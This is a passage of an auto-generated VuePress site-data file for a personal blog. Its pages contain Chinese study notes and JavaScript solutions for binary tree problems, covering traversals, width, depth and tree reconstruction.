/**
 * Generated by "@vuepress/internal-site-data"
 */
export const siteData = {
  "title": "yang-blog",
  "description": "Keep Coding",
  "base": "/yang-blog/",
  "headTags": [
    [
      "link",
      {
        "rel": "icon",
        "href": "./public/"
      }
    ]
  ],
  "pages": [
    {
      "title": "前序遍历",
      "frontmatter": {
        "title": "前序遍历"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "relativePath": "dataStructure/二叉树/前序遍历.md",
      "key": "v-c8550c00",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "headers": [
        {
          "level": 3,
          "title": "步骤",
          "slug": "步骤",
          "normalizedTitle": "步骤",
          "charIndex": 97
        },
        {
          "level": 3,
          "title": "题目",
          "slug": "题目",
          "normalizedTitle": "题目",
          "charIndex": 123
        }
      ],
      "headersStr": "步骤 题目",
      "content": "左神课程链接-> 见 1:07:14 ☀️☀️☀️\n\n * 通过递归序实现，前序：在第一次经过自己时 push，中序：在第二次经过自己时 push，后序：在第三次经过自己时 push。\n\n\n# 步骤\n\n * 前序遍历(先序遍历):根左右\n\n\n# 题目\n\n# LeeCode 144 题\n\nconst tree = {\n  val: \"1\",\n  left: {\n    val: \"2\",\n    left: { val: \"4\", left: null, right: null },\n    right: { val: \"5\", left: null, right: null },\n  },\n  right: {\n    val: \"3\",\n    left: { val: \"6\", left: null, right: null },\n    right: { val: \"7\", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preorderTraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreorderTraversal(tree);\n\n\n栈（非递归实现）\n\n * 取根节点为目标节点，开始遍历\n * 1.左孩子入栈 -> 直至左孩子为空的节点\n * 2.栈顶节点的右节点为空或右节点被访问过 -> 节点出栈并访问他，将节点标记为已访问\n * 3.栈顶节点的右节点不为空且未被访问，以右孩子为目标节点，再依次执行 1、2、3\n\nvar preorderTraversal = function (root) {\n  if (!root.val) return [];\n  let result = [];\n  let stack = [root]; //定义栈\n  while (stack.length) {\n    //出栈\n    let o = stack.pop();\n    result.push(o.val);\n    //入栈\n    o.right && stack.push(o.right);\n    o.left && stack.push(o.left);\n  }\n  return result;\n};\npreorderTraversal(tree);\n//或者\nvar preorderTraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      result.push(current.val);\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    current = current.right;\n  }\n  return result;\n};\npreorderTraversal(tree);\n",
      "normalizedContent": "左神课程链接-> 见 1:07:14 ☀️☀️☀️\n\n * 通过递归序实现，前序：在第一次经过自己时 push，中序：在第二次经过自己时 push，后序：在第三次经过自己时 push。\n\n\n# 步骤\n\n * 前序遍历(先序遍历):根左右\n\n\n# 题目\n\n# leecode 144 题\n\nconst tree = {\n  val: \"1\",\n  left: {\n    val: \"2\",\n    left: { val: \"4\", left: null, right: null },\n    right: { val: \"5\", left: null, right: null },\n  },\n  right: {\n    val: \"3\",\n    left: { val: \"6\", left: null, right: null },\n    right: { val: \"7\", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preordertraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreordertraversal(tree);\n\n\n栈（非递归实现）\n\n * 取根节点为目标节点，开始遍历\n * 1.左孩子入栈 -> 直至左孩子为空的节点\n * 2.栈顶节点的右节点为空或右节点被访问过 -> 节点出栈并访问他，将节点标记为已访问\n * 3.栈顶节点的右节点不为空且未被访问，以右孩子为目标节点，再依次执行 1、2、3\n\nvar preordertraversal = function (root) {\n  if (!root.val) return [];\n  let result = [];\n  let stack = [root]; //定义栈\n  while (stack.length) {\n    //出栈\n    let o = stack.pop();\n    result.push(o.val);\n    //入栈\n    o.right && stack.push(o.right);\n    o.left && stack.push(o.left);\n  }\n  return result;\n};\npreordertraversal(tree);\n//或者\nvar preordertraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      result.push(current.val);\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    current = current.right;\n  }\n  return result;\n};\npreordertraversal(tree);\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "二叉树的宽度",
      "frontmatter": {
        "title": "二叉树的宽度"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html",
      "relativePath": "dataStructure/二叉树/二叉树的宽度.md",
      "key": "v-8ec5a598",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%AE%BD%E5%BA%A6.html",
      "headers": [
        {
          "level": 2,
          "title": "二叉树的宽度",
          "slug": "二叉树的宽度",
          "normalizedTitle": "二叉树的宽度",
          "charIndex": 2
        },
        {
          "level": 2,
          "title": "宽度遍历(队列)",
          "slug": "宽度遍历-队列",
          "normalizedTitle": "宽度遍历(队列)",
          "charIndex": 50
        },
        {
          "level": 2,
          "title": "求最大宽度",
          "slug": "求最大宽度",
          "normalizedTitle": "求最大宽度",
          "charIndex": 506
        },
        {
          "level": 3,
          "title": "思路",
          "slug": "思路",
          "normalizedTitle": "思路",
          "charIndex": 516
        },
        {
          "level": 3,
          "title": "题目描述",
          "slug": "题目描述",
          "normalizedTitle": "题目描述",
          "charIndex": 538
        }
      ],
      "headersStr": "二叉树的宽度 宽度遍历(队列) 求最大宽度 思路 题目描述",
      "content": "# 二叉树的宽度\n\n若某一层的节点数不少于其他层次的节点数,那么该节点数即为二叉树的宽度。\n\n\n# 宽度遍历(队列)\n\n  var widthOfBinaryTree = function(root) {\n    if(root === null) return\n    const result  = []\n    const queue = [] //定义空队列\n    queue.push(root)\n    while(queue.length){\n      let current = queue.shift() \n      result.push(current.val)\n      if(current.left!==null){\n        queue.push(current.left)\n      }\n      if(current.right!==null){\n        queue.push(current.right)\n      }\n    } \n    return result   \n  };\n  widthOfBinaryTree(tree)\n\n\n\n# 求最大宽度\n\n\n# 思路\n\n * 统计每一层的节点个数\n\n\n# 题目描述\n\n * Leetcode662 给定一个二叉树，编写一个函数来获取这个树的最大宽度。树的宽度是所有层中的最大宽度。这个二叉树与满二叉树（full binary tree）结构相同，但一些节点为空。 每一层的宽度被定义为两个端点（该层最左和最右的非空节点，两端点间的null节点也计入长度）之间的长度。\n\n * 非递归\n\nvar widthOfBinaryTree = function(root) {\n\n    if (!root) return 0;\n\n    //queue存储节点，numArr存储节点对应的节点编号位置\n    var queue = [root], numArr = [0], maxWidth = 1;\n\n    while (queue.length) {\n        //tempQueue存储每一层级所有的节点，tempNumArr存储对应节点的编号位置\n        var tempQueue = [], tempNumArr = [];\n        while (queue.length) {\n            var node = queue.shift(), num = numArr.shift(); //取出栈底节点和编号\n\n            if (node.left) {\n                tempQueue.push(node.left);\n                tempNumArr.push(num * 2 + 1);\n            }\n            if (node.right) {\n                tempQueue.push(node.right);\n                tempNumArr.push(num * 2 + 2);\n            }\n        }\n        var tempWidth = 0;\n        //计算tempNumArr中存储的这一层的宽度, 最后一位元素存储这一层级最大宽度的编号\n        if (tempNumArr.length) {\n            tempWidth = tempNumArr[tempNumArr.length - 1] - tempNumArr[0] + 1;\n        }\n        if (tempWidth > maxWidth) {\n            maxWidth = tempWidth;  //更新最大宽度\n        }\n\n        //开始下一个层级的宽度计算\n        queue = tempQueue;\n        numArr = tempNumArr;\n    }\n\n    return maxWidth;\n};\n\n\n * 递归\n\nvar widthOfBinaryTree2 = function(root) {\n\n    if (!root) return 0;\n\n    var res = [], maxWidth = 1;\n    recusion(root, 0, 0);\n    return maxWidth;\n\n    function recusion(root, level, num){\n\n        if (res[level]){\n            res[level].push(num);\n        }\n        else{\n            res[level] = [num];\n        }\n\n        //计算最大宽度\n        var tempArr = res[level];\n        var tempWidth = tempArr[tempArr.length - 1] - tempArr[0] + 1;\n        if (tempWidth > maxWidth) {\n            maxWidth = tempWidth;\n        }\n\n        if (root.left){\n            recusion(root.left, level + 1, num * 2 + 1);\n        }\n        if (root.right){\n            recusion(root.right, level + 1, num * 2 + 2);\n        }\n    }\n};\n",
      "normalizedContent": "# 二叉树的宽度\n\n若某一层的节点数不少于其他层次的节点数,那么该节点数即为二叉树的宽度。\n\n\n# 宽度遍历(队列)\n\n  var widthofbinarytree = function(root) {\n    if(root === null) return\n    const result  = []\n    const queue = [] //定义空队列\n    queue.push(root)\n    while(queue.length){\n      let current = queue.shift() \n      result.push(current.val)\n      if(current.left!==null){\n        queue.push(current.left)\n      }\n      if(current.right!==null){\n        queue.push(current.right)\n      }\n    } \n    return result   \n  };\n  widthofbinarytree(tree)\n\n\n\n# 求最大宽度\n\n\n# 思路\n\n * 统计每一层的节点个数\n\n\n# 题目描述\n\n * leetcode662 给定一个二叉树，编写一个函数来获取这个树的最大宽度。树的宽度是所有层中的最大宽度。这个二叉树与满二叉树（full binary tree）结构相同，但一些节点为空。 每一层的宽度被定义为两个端点（该层最左和最右的非空节点，两端点间的null节点也计入长度）之间的长度。\n\n * 非递归\n\nvar widthofbinarytree = function(root) {\n\n    if (!root) return 0;\n\n    //queue存储节点，numarr存储节点对应的节点编号位置\n    var queue = [root], numarr = [0], maxwidth = 1;\n\n    while (queue.length) {\n        //tempqueue存储每一层级所有的节点，tempnumarr存储对应节点的编号位置\n        var tempqueue = [], tempnumarr = [];\n        while (queue.length) {\n            var node = queue.shift(), num = numarr.shift(); //取出栈底节点和编号\n\n            if (node.left) {\n                tempqueue.push(node.left);\n                tempnumarr.push(num * 2 + 1);\n            }\n            if (node.right) {\n                tempqueue.push(node.right);\n                tempnumarr.push(num * 2 + 2);\n            }\n        }\n        var tempwidth = 0;\n        //计算tempnumarr中存储的这一层的宽度, 最后一位元素存储这一层级最大宽度的编号\n        if (tempnumarr.length) {\n            tempwidth = tempnumarr[tempnumarr.length - 1] - tempnumarr[0] + 1;\n        }\n        if (tempwidth > maxwidth) {\n            maxwidth = tempwidth;  //更新最大宽度\n        }\n\n        //开始下一个层级的宽度计算\n        queue = tempqueue;\n        numarr = tempnumarr;\n    }\n\n    return maxwidth;\n};\n\n\n * 递归\n\nvar widthofbinarytree2 = function(root) {\n\n    if (!root) return 0;\n\n    var res = [], maxwidth = 1;\n    recusion(root, 0, 0);\n    return maxwidth;\n\n    function recusion(root, level, num){\n\n        if (res[level]){\n            res[level].push(num);\n        }\n        else{\n            res[level] = [num];\n        }\n\n        //计算最大宽度\n        var temparr = res[level];\n        var tempwidth = temparr[temparr.length - 1] - temparr[0] + 1;\n        if (tempwidth > maxwidth) {\n            maxwidth = tempwidth;\n        }\n\n        if (root.left){\n            recusion(root.left, level + 1, num * 2 + 1);\n        }\n        if (root.right){\n            recusion(root.right, level + 1, num * 2 + 2);\n        }\n    }\n};\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "中序遍历",
      "frontmatter": {
        "title": "中序遍历"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "relativePath": "dataStructure/二叉树/中序遍历.md",
      "key": "v-4c65533e",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "headers": [
        {
          "level": 3,
          "title": "步骤",
          "slug": "步骤",
          "normalizedTitle": "步骤",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "题目",
          "slug": "题目",
          "normalizedTitle": "题目",
          "charIndex": 22
        }
      ],
      "headersStr": "步骤 题目",
      "content": "# 步骤\n\n * 中序遍历:左根右\n\n\n# 题目\n\n# LeeCode 144 题\n\nconst tree = {\n  val: \"1\",\n  left: {\n    val: \"2\",\n    left: { val: \"4\", left: null, right: null },\n    right: { val: \"5\", left: null, right: null },\n  },\n  right: {\n    val: \"3\",\n    left: { val: \"6\", left: null, right: null },\n    right: { val: \"7\", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preorderTraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreorderTraversal(tree);\n\n\n栈（非递归实现)\n\n * 每颗子树整棵树左边界全部进栈，\n * 依次弹出的过程中，push，并对弹出节点的右树重复如上操作\n\nvar preorderTraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    result.push(current.val);\n    current = current.right;\n  }\n  return result;\n};\npreorderTraversal(tree);\n",
      "normalizedContent": "# 步骤\n\n * 中序遍历:左根右\n\n\n# 题目\n\n# leecode 144 题\n\nconst tree = {\n  val: \"1\",\n  left: {\n    val: \"2\",\n    left: { val: \"4\", left: null, right: null },\n    right: { val: \"5\", left: null, right: null },\n  },\n  right: {\n    val: \"3\",\n    left: { val: \"6\", left: null, right: null },\n    right: { val: \"7\", left: null, right: null },\n  },\n};\n\n\n递归\n\nvar preordertraversal = function (root) {\n  if (!root.val) return [];\n  const result = [];\n  var func = (node) => {\n    if (node) {\n      // 先添加根节点\n      result.push(node.val);\n      //遍历左子树\n      func(node.left);\n      //遍历右子树\n      func(node.right);\n    }\n  };\n  func(root);\n  return result;\n};\npreordertraversal(tree);\n\n\n栈（非递归实现)\n\n * 每颗子树整棵树左边界全部进栈，\n * 依次弹出的过程中，push，并对弹出节点的右树重复如上操作\n\nvar preordertraversal = function (root) {\n  const result = [];\n  const stack = [];\n  let current = root;\n  while (current || stack.length > 0) {\n    while (current) {\n      stack.push(current);\n      current = current.left;\n    }\n    current = stack.pop();\n    result.push(current.val);\n    current = current.right;\n  }\n  return result;\n};\npreordertraversal(tree);\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "后序遍历",
      "frontmatter": {
        "title": "后序遍历"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "relativePath": "dataStructure/二叉树/后序遍历.md",
      "key": "v-b0942ea8",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "headers": [
        {
          "level": 3,
          "title": "步骤",
          "slug": "步骤",
          "normalizedTitle": "步骤",
          "charIndex": 2
        }
      ],
      "headersStr": "步骤",
      "content": "# 步骤\n\n * 后序遍历(先序遍历):左右根\n\n递归\n\nvar postorderTraversal = function (root, array = []) {\n  if (root) {\n    postorderTraversal(root.left, array);\n    postorderTraversal(root.right, array);\n    array.push(root.val);\n  }\n  return array;\n};\npreorderTraversal(tree);\n\n\n栈（非递归实现）\n\n * 弹出栈，放入回收栈，\n * 先左再右进栈\n * 循环这个操作，push 回收站中的 val\n\nvar postorderTraversal = function (root) {\n  const result = [];\n  if (root !== null) {\n    const stack1 = [];\n    const stack2 = [];\n    stack1.push(root);\n    while (stack1.length) {\n      root = stack1.pop();\n      stack2.push(root);\n      if (root.left !== null) {\n        stack1.push(root.left);\n      }\n      if (root.right !== null) {\n        stack1.push(root.right);\n      }\n    }\n    while (stack2.length) {\n      result.push(stack2.pop().val);\n    }\n  }\n  return result;\n};\npostorderTraversal(tree);\n",
      "normalizedContent": "# 步骤\n\n * 后序遍历(先序遍历):左右根\n\n递归\n\nvar postordertraversal = function (root, array = []) {\n  if (root) {\n    postordertraversal(root.left, array);\n    postordertraversal(root.right, array);\n    array.push(root.val);\n  }\n  return array;\n};\npreordertraversal(tree);\n\n\n栈（非递归实现）\n\n * 弹出栈，放入回收栈，\n * 先左再右进栈\n * 循环这个操作，push 回收站中的 val\n\nvar postordertraversal = function (root) {\n  const result = [];\n  if (root !== null) {\n    const stack1 = [];\n    const stack2 = [];\n    stack1.push(root);\n    while (stack1.length) {\n      root = stack1.pop();\n      stack2.push(root);\n      if (root.left !== null) {\n        stack1.push(root.left);\n      }\n      if (root.right !== null) {\n        stack1.push(root.right);\n      }\n    }\n    while (stack2.length) {\n      result.push(stack2.pop().val);\n    }\n  }\n  return result;\n};\npostordertraversal(tree);\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "层序遍历",
      "frontmatter": {
        "title": "层序遍历"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "relativePath": "dataStructure/二叉树/层序遍历.md",
      "key": "v-0ac26bb5",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86.html",
      "headers": [
        {
          "level": 3,
          "title": "返回一维数组",
          "slug": "返回一维数组",
          "normalizedTitle": "返回一维数组",
          "charIndex": 32
        },
        {
          "level": 3,
          "title": "返回二数组",
          "slug": "返回二数组",
          "normalizedTitle": "返回二数组",
          "charIndex": 514
        }
      ],
      "headersStr": "返回一维数组 返回二数组",
      "content": " * 层序遍历：即逐层地，从左到右访问所有节点(队列)\n\n\n# 返回一维数组\n\n * 根节点入队，依次循环队中节点，将节点出队，并将子节点入队\n * 基于队先进先出的特点，根节点先入队，所以先出队进入res数组\n\nvar levelOrder = function (root) {\n    // 临界值\n    if (root == null) return [];\n    // 定义队列\n    const queue = [];\n    // 返回值\n    const res = [];\n    queue.push(root);\n    while (queue.length) {\n        const node = queue.shift();\n        // 左右节点不为空，入队继续遍历\n        if (node.left) queue.push(node.left);\n        if (node.right) queue.push(node.right);\n        res.push(node.val);\n    }\n    return res;\n};\n\n\n\n# 返回二数组\n\n * 相比于一维数组，多进行一层的遍历，当前层放置于一个数组中\n\nvar levelOrder = function (root) {\n    // 返回值约定好说返回二维数组，实际上为空树时还是得已[]返回?\n    if(root == null) return [];\n    const queue = [];\n    const res = [];\n    \n    queue.push(root);\n    while (queue.length) {\n        // 使用arr添加这一层的元素\n        const arr = [];\n        // 记录当前值的节点数量,后续操作出入队数量会变化\n        const n = queue.length;\n        for(let i = 0; i < n; i++){\n            const node = queue.shift();\n            arr.push(node.val);\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n        res.push(arr);\n    }\n    return res;\n};\n",
      "normalizedContent": " * 层序遍历：即逐层地，从左到右访问所有节点(队列)\n\n\n# 返回一维数组\n\n * 根节点入队，依次循环队中节点，将节点出队，并将子节点入队\n * 基于队先进先出的特点，根节点先入队，所以先出队进入res数组\n\nvar levelorder = function (root) {\n    // 临界值\n    if (root == null) return [];\n    // 定义队列\n    const queue = [];\n    // 返回值\n    const res = [];\n    queue.push(root);\n    while (queue.length) {\n        const node = queue.shift();\n        // 左右节点不为空，入队继续遍历\n        if (node.left) queue.push(node.left);\n        if (node.right) queue.push(node.right);\n        res.push(node.val);\n    }\n    return res;\n};\n\n\n\n# 返回二数组\n\n * 相比于一维数组，多进行一层的遍历，当前层放置于一个数组中\n\nvar levelorder = function (root) {\n    // 返回值约定好说返回二维数组，实际上为空树时还是得已[]返回?\n    if(root == null) return [];\n    const queue = [];\n    const res = [];\n    \n    queue.push(root);\n    while (queue.length) {\n        // 使用arr添加这一层的元素\n        const arr = [];\n        // 记录当前值的节点数量,后续操作出入队数量会变化\n        const n = queue.length;\n        for(let i = 0; i < n; i++){\n            const node = queue.shift();\n            arr.push(node.val);\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n        res.push(arr);\n    }\n    return res;\n};\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "最大最小深度",
      "frontmatter": {
        "title": "最大最小深度"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html",
      "relativePath": "dataStructure/二叉树/最小最大深度.md",
      "key": "v-8f072a64",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%9C%80%E5%B0%8F%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6.html",
      "headers": [
        {
          "level": 2,
          "title": "最小深度",
          "slug": "最小深度",
          "normalizedTitle": "最小深度",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "leetCode 111题",
          "slug": "leetcode-111题",
          "normalizedTitle": "leetcode 111题",
          "charIndex": 62
        },
        {
          "level": 2,
          "title": "最大深度",
          "slug": "最大深度",
          "normalizedTitle": "最大深度",
          "charIndex": 188
        },
        {
          "level": 3,
          "title": "leetCode 104题",
          "slug": "leetcode-104题",
          "normalizedTitle": "leetcode 104题",
          "charIndex": 931
        },
        {
          "level": 3,
          "title": "bfs",
          "slug": "bfs",
          "normalizedTitle": "bfs",
          "charIndex": 1093
        }
      ],
      "headersStr": "最小深度 leetCode 111题 最大深度 leetCode 104题 bfs",
      "content": "# 最小深度\n\n * 最小深度是从根节点到最近叶子节点的最短路径上的节点数量。说明：叶子节点是指没有子节点的节点。\n\n\n# leetCode 111题\n\n# 队列\n\n * 1、根节点出发,当前节点及给定默认最小深度入队\n * 2、循环，根节点出队，如果当前节点既没有左子树，右子树，返回当前深度1\n * 3、左右节点分别入队列,深度+1\n * 4、周而复始,直至清空队列，返回最大深度\n\nvar minDepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n# 递归\n\n * 左右子树都不为空：左子树深度和右子树最小深度的最小值 + 1\n * 左树为空：右子树最小深度的最小值 + 1\n * 右树为空：左子树最小深度 + 1\n\n\n#\n\nvar minDepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n\n# 最大深度\n\n * 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数\n\n\n# leetCode 104题\n\n# 递归\n\nvar maxDepth = function (root) {\n    if (root == null) return 0;\n    return Math.max(maxDepth(root.left), maxDepth(root.right)) + 1;\n};\n\n\n\n# bfs\n\n * 每通过一层deep++\n\nvar maxDepth = function (root) {\n    if (root == null) return 0;\n    const queue = [];\n    let deep = 0;\n    queue.push(root);\n    while (queue.length) {\n        deep++;\n        const n = queue.length;\n        for (let i = 0; i < n; i++) {\n            const node = queue.shift();\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n    }\n    return deep;\n};\n",
      "normalizedContent": "# 最小深度\n\n * 最小深度是从根节点到最近叶子节点的最短路径上的节点数量。说明：叶子节点是指没有子节点的节点。\n\n\n# leetcode 111题\n\n# 队列\n\n * 1、根节点出发,当前节点及给定默认最小深度入队\n * 2、循环，根节点出队，如果当前节点既没有左子树，右子树，返回当前深度1\n * 3、左右节点分别入队列,深度+1\n * 4、周而复始,直至清空队列，返回最大深度\n\nvar mindepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n# 递归\n\n * 左右子树都不为空：左子树深度和右子树最小深度的最小值 + 1\n * 左树为空：右子树最小深度的最小值 + 1\n * 右树为空：左子树最小深度 + 1\n\n\n#\n\nvar mindepth = function(root) {\n  if(!root) return 0;\n  const queue = [[root,1]];\n  while(queue.length){\n      let [o,n]= queue.shift();\n      if(!o.left&&!o.right) {\n          return n;\n      }\n     if(o.left) queue.push([o.left,n+1]);\n     if(o.right) queue.push([o.right,n+1]);\n  }\n  return n;\n};\n\n\n\n# 最大深度\n\n * 二叉树的深度为根节点到最远叶子节点的最长路径上的节点数\n\n\n# leetcode 104题\n\n# 递归\n\nvar maxdepth = function (root) {\n    if (root == null) return 0;\n    return math.max(maxdepth(root.left), maxdepth(root.right)) + 1;\n};\n\n\n\n# bfs\n\n * 每通过一层deep++\n\nvar maxdepth = function (root) {\n    if (root == null) return 0;\n    const queue = [];\n    let deep = 0;\n    queue.push(root);\n    while (queue.length) {\n        deep++;\n        const n = queue.length;\n        for (let i = 0; i < n; i++) {\n            const node = queue.shift();\n            if(node.left) queue.push(node.left);\n            if(node.right) queue.push(node.right);\n        }\n    }\n    return deep;\n};\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "重建二叉树",
      "frontmatter": {
        "title": "重建二叉树"
      },
      "regularPath": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html",
      "relativePath": "dataStructure/二叉树/重建二叉树.md",
      "key": "v-da74fa72",
      "path": "/dataStructure/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91.html",
      "headers": [
        {
          "level": 2,
          "title": "题目",
          "slug": "题目",
          "normalizedTitle": "题目",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "剑指 Offer 07",
          "slug": "剑指-offer-07",
          "normalizedTitle": "剑指 offer 07",
          "charIndex": 9
        },
        {
          "level": 3,
          "title": "LeetCode 889",
          "slug": "leetcode-889",
          "normalizedTitle": "leetcode 889",
          "charIndex": 1240
        }
      ],
      "headersStr": "题目 剑指 Offer 07 LeetCode 889",
      "content": "# 题目\n\n\n# 剑指 Offer 07\n\n * LeetCode输入某二叉树的前序遍历和中序遍历的结果，请构建该二叉树并返回其根节点。\n\n假设输入的前序遍历和中序遍历的结果中都不含重复的数字。\n\n# 思路\n\n * 1、前序遍历找到根结点root\n * 2、找到root在中序遍历的位置 -> 左子树的长度和右子树的长度\n * 3、截取左子树的中序遍历、右子树的中序遍历\n * 4、截取左子树的前序遍历、右子树的前序遍历\n * 5、递归重建二叉树\n\n# 代码\n\n递归\n\nfunction TreeNode(val) {\n      this.val = val;\n      this.left = this.right = null;\n  }\n  const preorder = [3,9,20,15,7] //前序 节点是1\n  const inorder = [9,3,15,20,7] //中序\n  var reConstructBinaryTree = (preorder, inorder)=> {\n        if(preorder.length === 0){\n            return null;\n        }\n        if(preorder.length === 1){\n            return new TreeNode(preorder[0]);\n        }\n        // 找到根节点\n        let rootVal = preorder[0]\n        //跟节点在中序遍历中的索引\n        let index = inorder.indexOf(rootVal)\n       //先序左子树\n        let preLeft = preorder.slice(1,index+1)\n        //先序右子树\n        let preRight = preorder.slice(index+1)\n        //中序左子树\n        let inLeft = inorder.slice(0,index)\n        //中序右子树\n        let inRight = inorder.slice(index+1)\n        // 构建二叉树\n        const node  = new TreeNode(rootVal)\n        node.left = reConstructBinaryTree(preLeft,inLeft)\n        node.right = reConstructBinaryTree(preRight,inRight)\n        return node\n    }\n    reConstructBinaryTree(preorder, inorder)\n\n\n\n# LeetCode 889\n\n * LeetCode 给定两个整数数组，preorder 和 postorder ，其中 preorder 是一个具有 无重复 值的二叉树的前序遍历，postorder 是同一棵树的后序遍历，重构并返回二叉树。\n\n# 思路\n\n * 1、根据前序遍历找到根结点\n * 2、根据前序根节点后的数值确认左子树根节点\n * 3、通过左子树根节点在后序遍历中的index确认左子树和右子树\n * 4、截取左子树的中序遍历、右子树的中序遍历\n * 5、截取左子树的前序遍历、右子树的前序遍历\n * 6、递归重建二叉树输出中序遍历\n\nfunction TreeNode(val) {\n    this.val = val;\n    this.left = this.right = null;\n  }\n  var preorder = [1, 2, 4, 5, 3, 6, 7]\n  var  postorder = [4, 5, 2, 6, 7, 3, 1];\n  var constructFromPrePost = function (preorder, postorder) {\n    if (preorder.length === 0) {\n      return null;\n    }\n    if (preorder.length === 1) {\n      return new TreeNode(preorder[0]);\n    }\n    //根节点\n    let head = preorder[0];\n    //左子树根节点\n    let preLeftHead = preorder[1];\n    //后序遍历左子树根节点index\n    let index = postorder.indexOf(preLeftHead);\n    //先序、后序\n    let preLeft = preorder.slice(1, index + 2);\n    let preRight = preorder.slice(index + 2);\n    let postLeft = postorder.slice(0, index+1);\n    let postRight = postorder.slice(index+1, postorder.length - 1);\n    // 重建树\n    let root = new TreeNode(head);\n    root.left = constructFromPrePost(preLeft,postLeft)\n    root.right = constructFromPrePost(preRight,postRight)\n    return root\n  };\n  constructFromPrePost(preorder, postorder);\n",
